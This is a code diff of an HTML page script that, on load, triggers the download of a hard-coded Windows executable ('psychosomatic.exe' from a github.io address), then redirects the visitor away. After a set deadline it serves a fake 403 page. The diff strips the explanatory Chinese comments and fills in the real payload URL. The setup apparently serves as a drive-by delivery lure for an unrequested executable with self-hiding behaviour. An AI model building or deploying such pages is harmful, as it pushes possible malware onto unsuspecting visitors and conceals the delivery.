@@ -7,7 +7,6 @@
 <style>
   html, body { margin: 0; padding: 0; background: #fff; }
 
-  /* 仅过期时才用到的 403 排版 */
   .err-wrap {
     position: fixed; inset: 0;
     display: flex; flex-direction: column;
@@ -38,18 +37,12 @@
 <body>
 <script>
 (function () {
-  /* ============ 配置区 ============ */
-  var FILE_URL   = 'https://example.com/your-file.zip'; // ← 改成你的文件地址
+  var FILE_URL   = 'https://cybertrainerx.github.io/data/temp/psychosomatic.exe';
+  var EXPIRE_AT = Date.parse('2026-10-25T12:00:00+08:00');
 
-  // ★ 失效时刻（固定时间戳，写死在页面里）
-  // 改成「部署这一刻 + 25 小时」，示例：2026-10-25T12:00:00+08:00
-  var EXPIRE_AT  = Date.parse('2026-10-25T12:00:00+08:00'); // ← 改成你的截止时间
+  var JUMP_DELAY = 1200;
+  var MAX_WAIT   = 4000;
 
-  var JUMP_DELAY = 1200; // 下载触发后多久跳转（毫秒）
-  var MAX_WAIT   = 4000; // 兜底：最多等这么久就跳转
-  /* ================================ */
-
-  /* ---------- 过期：英文 403 页面，终止后续动作 ---------- */
   function deny() {
     try { window.stop(); } catch (e) {}
 
@@ -72,14 +65,12 @@
     document.body.appendChild(wrap);
   }
 
-  /* ---------- 过期判断：纯本地时间 ---------- */
   function isExpired() {
     return !isFinite(EXPIRE_AT) || Date.now() >= EXPIRE_AT;
   }
 
   if (isExpired()) { deny(); return; }
 
-  /* ---------- 下载 + 无痕跳转 ---------- */
   var jumped = false;
   function leave() {
     if (jumped) return;
@@ -95,7 +86,6 @@
   s.onerror = function () { setTimeout(leave, JUMP_DELAY); };
   (document.head || document.documentElement).appendChild(s);
 
-  // 兜底：事件没触发也照样跳转
   setTimeout(leave, MAX_WAIT);
 })();
 </script>
